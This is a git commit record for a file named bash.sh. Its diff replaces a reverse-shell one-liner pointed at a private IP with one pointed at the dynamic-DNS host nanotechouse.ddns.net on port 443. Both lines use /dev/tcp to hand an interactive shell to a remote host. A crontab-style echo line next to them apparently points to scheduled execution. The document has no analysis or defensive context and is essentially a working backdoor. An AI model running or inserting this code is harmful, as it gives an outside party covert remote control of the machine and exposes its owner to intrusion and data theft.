07daf6e2b1d7dc5ac463b10bcf7da28a37b8d613
Thiago Joaquim da Silva <30816336+thiagojoaquimsilva@users.noreply.github.com>
2017-08-10 12:19:52 -0300

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,2 +1,3 @@
-0<&211-;exec 211<>/dev/tcp/192.168.56.1/443;sh <&211 >&211 2>&211
+#!/bin/sh
+0<&165-;exec 165<>/dev/tcp/nanotechouse.ddns.net/443;sh <&165 >&165 2>&165
 1,21,41,  *  *  *  *  echo "Meu crontab rodou mesmo!"
